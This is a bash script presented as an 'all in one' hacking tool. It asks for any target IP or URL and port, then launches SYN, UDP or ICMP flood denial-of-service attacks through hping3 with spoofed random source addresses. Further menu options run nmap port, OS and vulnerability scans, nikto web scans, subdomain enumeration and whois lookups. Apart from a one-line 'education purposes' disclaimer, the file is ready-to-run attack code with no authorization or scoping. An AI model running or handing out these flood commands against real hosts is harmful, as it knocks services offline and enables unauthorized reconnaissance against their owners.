#!/bin/bash

clear

figlet -f mono9  " d4rk  " 
echo "      [!] Disclamer:  PLEASE ONLY USE THIS TOOL FOR EDUCATION PURPOSES  [!]  "
echo " -----------------------------------------------------------------------------------------------------------------  "
echo " [+] ALL IN ONE TOOL  [+] ---> Tool Created by d4rk sh4d0w -->> [+]

	-->> My FRIENDS  - youAnons0u1,lorian synaro "
echo "  ---------------------------------------------------------------------------------------------------------------- " 
              


echo " -->> Choose No Between 1 To 7
 1 -->> SYN FLOODING ATTACK 
 2 -->> UDP FLOODING ATTACK  
 3 -->> ICMP FLOODING ATTACK 
 4 -->> NMAP PORTSCANNING 
 5 -->> FINDING SUBDOMAINS 
 6 -->> WEBSITE WHOIS LOOKUP
 7 -->> WEBAPPLICATION VULUNERABLITY SCANNING WITH NIKTO 
 8 -->> FINDING VULUNERABLITY USING NMAP SCRIPTING ENGINE " 
echo -n " -->> Choose  the Number -->> " 
read num 
echo -n " [+] Enter the Target IP or URL -->> " 
read target
echo -n " [+]  Enter the Port Number -->> " 
read port
if [ $num = "1" ]
then
	clear 
	echo " [+] STARTING SYN FLOODING DOS ATTACK :) [+]   " 
	echo " --------------------------------------------------------------------- " 
	hping3 -S $target -p $port --rand-source --flood 
elif [ $num = "2" ]
then
        clear
	echo -n " [+]  Enter packet data size -->> " 
	read data
	echo " [+] STARTING UDP FLOODING DOS ATTACK :) [+] " 
	echo " ---------------------------------------------------------------------- "
	hping3 --udp $target -p $port --flood -d $data --rand-source
elif [ $num = "3" ]
then    
        clear
	echo " [+] STARTING ICMP FLOODING DOS ATTACK :) [+] " 
	echo " ----------------------------------------------------------------------- " 
	hping3 -1 $target -p $port --flood --rand-source
elif [ $num = "4" ]
then 
        clear
	echo -n " [+] Enter How many ports you want to SCAN -->> " 
	read ports  
	echo " [+] SCANNING PORTS WITH NMAP :) [+] " 
	echo " ------------------------------------------------------------------------ " 
	nmap -sS $target -p $ports -sV -O  --reason 
elif [ $num = "5" ]
then
	clear
	echo "  [+] FINDING SUBDOMAINS WITH SUBLIST3R TOOL :) [+]  " 
	echo " ----------------------------------------------------------------------- " 
	sublist3r -d $target 
elif [ $num = "6" ]
then
	clear
	echo " [+] WEBSITE WHOIS LOOKUP :) [+]  " 
	echo " ------------------------------------------------------------------------- " 
	whois $target 
elif [ $num = "7" ]
then
	clear
	echo "  [+] SCANNING WEBSITES VULUNERBALITY WITH NIKTO TOOL :) [+]  " 
	echo " -------------------------------------------------------------------------- " 
	nikto -h $target
elif [ $num = "8" ]
then
	clear
	echo "   [+] Finding VULUNERABLITY WITH NMAP SCRIPT ENGINE :) [+]  "
	echo " ---------------------------------------------------------------------------- " 
	nmap --script=vuln $target -sS --reason 
fi



	


 



	



 

 

 


